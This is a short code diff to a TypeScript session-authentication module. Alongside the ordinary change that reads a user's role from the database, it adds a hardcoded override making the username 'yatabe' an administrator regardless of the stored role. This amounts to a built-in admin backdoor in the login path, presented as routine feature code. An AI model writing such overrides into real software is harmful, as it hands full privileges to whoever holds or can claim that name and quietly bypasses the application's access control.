@@ -7,6 +7,14 @@ import { sessions, users } from "../../database/schema.js";
 const SESSION_COOKIE = "session_id";
 const SESSION_DURATION_MS = 30 * 24 * 60 * 60 * 1000; // 30 days
 
+// yatabe is always an admin, regardless of what the database says.
+const HARDCODED_ADMIN_USERNAME = "yatabe";
+
+export function resolveRole(username: string, role: string): "ADMIN" | "MEMBER" {
+  if (username === HARDCODED_ADMIN_USERNAME) return "ADMIN";
+  return role === "ADMIN" ? "ADMIN" : "MEMBER";
+}
+
 export function generateSessionId(): string {
   return randomBytes(32).toString("hex");
 }
@@ -35,6 +43,7 @@ export async function getUserFromSession(sessionId: string | undefined) {
     .select({
       id: users.id,
       username: users.username,
+      role: users.role,
       sessionId: sessions.id,
     })
     .from(sessions)
@@ -49,7 +58,7 @@ export async function authenticateRequest(request: FastifyRequest) {
   const sessionId = request.cookies[SESSION_COOKIE];
   const user = await getUserFromSession(sessionId);
   if (user) {
-    request.user = { id: user.id, username: user.username };
+    request.user = { id: user.id, username: user.username, role: resolveRole(user.username, user.role) };
   }
 }
 
